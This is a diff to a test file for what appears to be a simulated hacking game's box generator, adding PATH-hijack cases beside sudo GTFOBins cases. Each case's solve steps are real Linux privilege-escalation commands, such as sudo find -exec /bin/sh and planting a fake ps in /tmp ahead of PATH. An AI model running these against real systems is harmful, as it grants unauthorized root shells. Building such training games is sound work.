@@ -292,12 +292,14 @@ for (const level of LEVELS) {
         { template: 'sudo_gtfobin', sudoBin: 'find', solve: () => ['sudo -l', 'sudo find . -exec /bin/sh \\;'] },
         { template: 'sudo_gtfobin', sudoBin: 'python3', solve: () => ['sudo -l', "sudo python3 -c 'import os; os.system(\"/bin/sh\")'"] },
         { template: 'sudo_gtfobin', sudoBin: 'nice', solve: () => ['sudo -l', 'sudo nice /bin/sh'] },
+        { template: 'path_hijack', path: '/usr/local/bin/status-helper', hijackCmd: 'ps', solve: (p) => ["echo '#!/bin/sh' > /tmp/ps", "echo '/bin/sh' >> /tmp/ps", 'chmod +x /tmp/ps', 'export PATH=/tmp:$PATH', p] },
+        { template: 'path_hijack', path: '/opt/tools/checker', hijackCmd: 'whoami', solve: (p) => ["echo '#!/bin/sh' > /tmp/whoami", "echo '/bin/sh' >> /tmp/whoami", 'chmod +x /tmp/whoami', 'export PATH=/tmp:$PATH', p] },
     ];
 
     let bbPass = 0, bbFail = 0;
     cases.forEach((c, i) => {
         const codename = 'bb-test-' + i;
-        const json = sandbox4.BOXBUILDER.generate({ template: c.template, codename, path: c.path, sudoBin: c.sudoBin, flag: `flag{${codename}}` });
+        const json = sandbox4.BOXBUILDER.generate({ template: c.template, codename, path: c.path, sudoBin: c.sudoBin, hijackCmd: c.hijackCmd, flag: `flag{${codename}}` });
         const obj = JSON.parse(json);
         const schemaOk = sandbox4.GAME_CUSTOM.validate(obj).valid;
         const box = { id: 9500 + i, codename: obj.codename, user: obj.user, host: obj.host, cwd: obj.cwd, fs: obj.fs, wins: obj.wins, sudoers: obj.sudoers, flag: obj.flag };
